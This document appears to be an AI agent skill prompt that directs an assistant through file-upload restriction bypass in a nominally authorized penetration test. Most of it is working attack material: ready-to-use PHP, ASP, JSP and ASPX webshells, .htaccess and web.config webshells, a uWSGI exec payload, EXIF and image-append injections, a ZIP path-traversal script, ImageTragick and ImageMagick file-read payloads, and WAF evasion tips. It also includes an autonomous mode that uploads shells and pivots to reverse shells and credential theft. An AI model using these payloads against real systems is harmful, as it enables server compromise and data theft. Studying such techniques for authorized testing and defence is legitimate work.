---
name: file-upload-bypass
description: >
  Guide file upload restriction bypass during authorized penetration testing.
  Use when the user has found a file upload endpoint and wants to bypass
  validation to achieve code execution, or when testing upload functionality
  for vulnerabilities. Also triggers on: "file upload bypass", "upload shell",
  "webshell upload", "extension bypass", "upload filter bypass", "magic byte
  bypass", "content-type bypass", "upload RCE", "unrestricted file upload",
  "image upload exploit", "upload polyglot", ".htaccess upload", "web.config
  upload", "double extension". OPSEC: medium — uploaded files persist on disk,
  visible in web logs and file system. Tools: burpsuite, exiftool, ffuf.
  Do NOT use for command injection without upload — use command-injection instead.
  Do NOT use for LFI/RFI without upload — use lfi instead. Do NOT use for
  deserialization — use deserialization-* skills instead.
---

# File Upload Bypass

You are helping a penetration tester bypass file upload restrictions to achieve
code execution or other impact on the target server. The application has a file
upload feature with some form of validation that needs to be circumvented. All
testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Test bypass techniques systematically. Auto-detect server
  technology and validation type. Upload proof-of-concept, confirm execution.
  Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (bypass found,
  shell uploaded, execution confirmed, pivot to another skill):
  `### [HH:MM] file-upload-bypass → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `upload-extension-bypass.txt`, `upload-shell-execution.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[file-upload-bypass] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] file-upload-bypass → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[HH:MM]` with the actual current time. Run
`date +%H:%M` to get it. Never write the literal placeholder `[HH:MM]` —
activity.md entries need real timestamps for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- A file upload endpoint (form, API, drag-and-drop)
- Ability to intercept and modify requests (Burp Suite or similar proxy)
- Know or can discover: server technology (PHP/ASP/JSP/Node), web server
  (Apache/IIS/Nginx), where uploaded files land, whether they're directly
  accessible via URL

## Step 1: Assess

If not already provided, determine:
1. **Server stack** — PHP/ASP.NET/JSP/Node/Python (check headers, error pages,
   default files)
2. **Web server** — Apache/IIS/Nginx (response headers, default error pages)
3. **Validation type** — what gets rejected? Try uploading:
   - `test.php` (extension check)
   - `test.txt` with `Content-Type: application/x-php` (content-type check)
   - `test.txt` containing `<?php` (content inspection)
   - Binary file with wrong extension (magic byte check)
4. **Upload location** — where do files land? Can you access them directly via URL?
5. **Processing** — does the server resize images, rename files, strip metadata?

Understanding which validations are in place determines which bypass to use.
Skip if context was already provided.

## Step 2: Extension Bypass

The most common restriction. Try these in order of reliability.

### Alternative Extensions

Upload the same payload with different extensions for the target language:

```
# PHP (try each — server config determines which execute)
.php .php5 .php7 .phtml .pht .phar .phps .pgif .inc .hphp .module .shtml

# ASP/ASPX
.asp .aspx .ashx .asmx .config .cer .asa .cshtml .vbhtml

# JSP
.jsp .jspx .jsw .jsv .jspf .do .action

# Coldfusion
.cfm .cfml .cfc .dbm

# Perl
.pl .pm .cgi
```

### Double Extensions

Exploit misconfigured servers that check only the last extension but execute
based on the first recognized one:

```
shell.php.jpg          # Apache may execute as PHP if AddHandler is set
shell.php.png          # Same principle
shell.asp;.jpg         # IIS < 7.0 path parameter confusion
shell.aspx;1.jpg       # IIS semicolon truncation
shell.php.xxxxx        # Apache — unrecognized final ext, falls back to .php
```

**Reverse double extension** (Apache with misconfigured `AddHandler`):
```
shell.jpg.php          # Executes as PHP when AddHandler matches .php anywhere
```

### Null Byte Injection

Works on older systems (PHP < 5.3.4, some Java implementations):

```
shell.php%00.jpg       # URL-encoded null byte
shell.php\x00.jpg      # Literal null byte in multipart data
shell.php%00.png%00.jpg
```

### Case Variation

Bypass case-sensitive blacklists:

```
shell.pHp    shell.Php    shell.pHP5    shell.PhAr
shell.aSp    shell.aSpX   shell.AsHx
shell.jSp    shell.jSpX
```

### Special Characters

Bypass string-matching filters:

```
shell.php%20           # Trailing space (Windows strips it)
shell.php%0a           # Trailing newline
shell.php%0d%0a        # CRLF
shell.php.            # Trailing dot (Windows normalizes)
shell.php......        # Multiple dots
shell.php/            # Trailing slash
shell.php.\           # Trailing backslash (Windows)
```

### NTFS Alternate Data Streams (Windows/IIS)

```
shell.asp::$data       # Bypasses extension check, IIS serves as ASP
shell.aspx::$data
shell.php::$data
```

### Filename Length Overflow

Linux max filename: 255 bytes. Windows: 236 bytes. Craft a name where
truncation removes the safe extension:

```
# 232 A's + .php + .gif — truncation drops .gif on Windows
AAAA[x232].php.gif
```

### Right-to-Left Override (RTLO)

Unicode character `U+202E` reverses display order:

```
shell.%E2%80%AEphp.jpg    # Displays as shell.gpj.php in some contexts
```

## Step 3: Content-Type & Magic Byte Bypass

### Content-Type Manipulation

Change the `Content-Type` header in the upload request to an allowed MIME type:

```http
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/gif
```

Keep the actual file content as your payload. Many applications check only
the Content-Type header, not the file contents.

### Magic Byte Prepending

Prepend valid file signatures before your payload to bypass file-type detection:

| Format | Magic Bytes | Notes |
|--------|-------------|-------|
| GIF | `GIF89a` | Plain ASCII — easiest to use |
| JPEG | `\xff\xd8\xff\xe0` | Binary header |
| PNG | `\x89PNG\r\n\x1a\n` | Binary header |
| PDF | `%PDF-1.5` | Plain ASCII |

```bash
# Create a GIF-PHP polyglot (GIF is easiest — plain text header)
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

### Combined Bypass

When both Content-Type and magic bytes are checked, set `Content-Type: image/gif`,
start content with `GIF89a`, append PHP payload, and use an extension bypass from
Step 2 for the filename.

## Step 4: Server Configuration Exploitation

Upload configuration files that change how the server handles other files.

### Apache .htaccess

Upload a `.htaccess` file that makes a custom extension executable:

```apache
AddType application/x-httpd-php .rce
```

Then upload `shell.rce` — Apache executes it as PHP.

**Self-contained .htaccess webshell** (the .htaccess itself runs as PHP):

```apache
<Files ~ "^\.ht">
  Order allow,deny
  Allow from all
</Files>
AddType application/x-httpd-php .htaccess
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

### IIS web.config

Upload a `web.config` that registers a handler for `.config` files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
  </system.webServer>
</configuration>
<!-- <% Response.write("-"&"->") %>
<% Set c=CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd"))
Response.Write(c.StdOut.ReadAll):Response.write("<!-"&"-") %> -->
```

Add `<security><requestFiltering>` to remove `.config` from hidden segments
if direct access is blocked.

### uWSGI .ini

If the server uses uWSGI and processes uploaded `.ini` files:

```ini
[uwsgi]
; RCE via exec magic operator
body = @(exec://whoami)
; SSRF via http magic operator
test = @(http://169.254.169.254/latest/meta-data/)
```

Executes when uWSGI parses the config (restart, crash, autoreload).

## Step 5: Image Polyglots & Metadata Injection

For applications that validate image dimensions, run `getimagesize()`, or
reprocess images.

### EXIF Metadata Injection

Embed PHP in image metadata — survives basic validation but not reprocessing:

```bash
# Embed payload in EXIF Comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg

# Embed in multiple EXIF fields for redundancy
exiftool -Artist='<?php system($_GET["cmd"]); __halt_compiler(); ?>' \
         -Copyright='<?php eval($_POST["x"]); ?>' legit.jpg
```

Exploit via LFI: `include('/uploads/shell.php.jpg')` executes the PHP in
metadata.

### Simple Append

Append PHP to a valid image — survives `getimagesize()` but not reprocessing:

```bash
cp legit.png shell.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.png
```

### Polyglot Images (Survive Reprocessing)

For apps that run `imagecreatefromjpeg()` / `imagepng()` / GD library, encode
the payload into pixel data so it survives image reprocessing:

- **PNG via PLTE chunk**: Encode payload bytes as RGB color values in the palette.
  Use `imagecreate()` + `imagecolorallocate()` + `imagepng()`. Payload length
  must be divisible by 3.
- **GIF via global color table**: Same approach with `imagegif()`.

These produce valid images with PHP in pixel data — require LFI or a
misconfiguration to trigger execution.

## Step 6: Archive & Indirect Exploitation

### ZIP Path Traversal

If the application extracts uploaded archives, inject path traversal in
filenames to write outside the upload directory:

```python
import zipfile
from io import BytesIO

f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../var/www/html/shell.php',
           '<?php system($_GET["cmd"]); ?>')
z.writestr('readme.txt', 'Legit content')
z.close()
with open('payload.zip', 'wb') as out:
    out.write(f.getvalue())
```

**Symlink technique** — read arbitrary files:

```bash
ln -s /etc/passwd symlink.txt
zip --symlinks payload.zip symlink.txt
```

### Filename Injection

If uploaded filenames are used in server-side operations without sanitization:

```
# SQL injection via filename
shell.jpg' OR 1=1--.php

# Command injection via filename
shell.jpg;sleep 10;.php

# XSS via filename (stored in admin panel)
"><img src=x onerror=alert(1)>.jpg

# Path traversal via filename
../../../etc/passwd.jpg
```

### Race Conditions

If the server uploads to a temporary location then validates/deletes, race it:
upload a webshell in a rapid loop while simultaneously requesting the temporary
path. Use two threads — one POSTing the upload, one GETting the expected URL.
If you hit the window between upload and deletion, the shell executes. Burp
Intruder or `turbo-intruder` are effective for tight race windows.

### ImageMagick Exploits

If the server processes images with ImageMagick:

**CVE-2022-44268 (arbitrary file read):**

```bash
pngcrush -text a "profile" "/etc/passwd" exploit.png
# Upload exploit.png → server processes with convert → download result
identify -verbose converted.png  # hex-encoded file contents in metadata
```

**CVE-2016-3714 (ImageTragick RCE):**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.jpg"|id > /tmp/proof")'
pop graphic-context
```

Save as `.mvg`, `.svg`, or any image extension that ImageMagick processes.

## Step 7: Webshell Payloads

Minimal payloads for each language — use after achieving a bypass.

```php
# PHP — standard
<?php system($_GET['cmd']); ?>
# PHP — minimal (17 bytes)
<?=`$_GET[0]`?>
# PHP — if <?php blocked
<script language="php">system($_GET['cmd']);</script>
# PHP — if system() blocked: shell_exec(), passthru(), backticks

# ASP
<% Set c=CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")):Response.Write(c.StdOut.ReadAll) %>

# JSP
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

# ASPX (C#)
<%@ Page Language="C#" %><%new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()%>
```

## Step 8: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Shell uploaded and executing**: Establish reverse shell, route to privilege
  escalation
- **Can upload but not execute directly**: Combine with **lfi** to include the
  uploaded file as code
- **Found SSRF via ImageMagick/FFmpeg**: Route to **ssrf** for internal
  network exploitation
- **Can upload .htaccess/.config but not shells**: Upload config to enable
  execution, then re-upload shell
- **Found SQL injection via filename**: Route to **sql-injection-error** or
  **sql-injection-blind**
- **Got file read (ZIP symlink, ImageMagick)**: Extract credentials, config
  files, source code — pivot to direct exploitation
- **Server-side XSS via SVG upload**: Route to **xss-stored**

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: server technology, validated bypass technique,
upload location, current mode.

## OPSEC Notes

- Uploaded files persist on disk — **always clean up** webshells after testing
- Upload activity logged in web server access logs and potentially WAF logs
- `.htaccess` / `web.config` changes affect all users — restore originals
- Polyglot images are stealthier than raw PHP files
- Use innocuous filenames for initial testing (`test.jpg`, not `shell.php`)
- Race condition exploits generate high request volume — may trigger rate limiting

## Troubleshooting

### All Extensions Rejected

- Check if the server uses a whitelist (only allows `.jpg`, `.png`, etc.)
  vs a blacklist (blocks `.php`, `.asp`, etc.)
- Whitelist: focus on polyglot techniques + LFI chain, or config file upload
  (.htaccess / web.config)
- Blacklist: try every alternative extension from Step 2 systematically
- Use Burp Intruder with extension wordlist for automated testing

### File Uploads but Doesn't Execute

- Check if the file is renamed (hash-based names prevent direct execution)
- Check if files are served from a different domain/CDN (no server-side execution)
- Check if the upload directory has execution disabled (try path traversal in
  the filename to write elsewhere: `../shell.php`)
- Try config file upload to re-enable execution in the upload directory

### Image Validation Passes but PHP Stripped

- Server may be reprocessing images (GD library, ImageMagick)
- Try polyglot techniques from Step 5 that survive reprocessing
- Try EXIF injection — some reprocessors preserve metadata
- Fall back to ImageMagick CVEs if the server uses it

### Can't Find Upload Location

- Check response headers/body after upload for the file URL
- Try common paths: `/uploads/`, `/images/`, `/media/`, `/files/`, `/tmp/`
- Check HTML source for upload form action and any path hints
- Fuzz with ffuf: `ffuf -u http://TARGET/FUZZ/filename.ext -w common.txt`

### WAF Blocking Upload Requests

- Try chunked transfer encoding
- Modify multipart boundary to unusual values
- Add extra Content-Disposition parameters
- Split payload across multiple form fields
- URL-encode parts of the filename in the multipart header
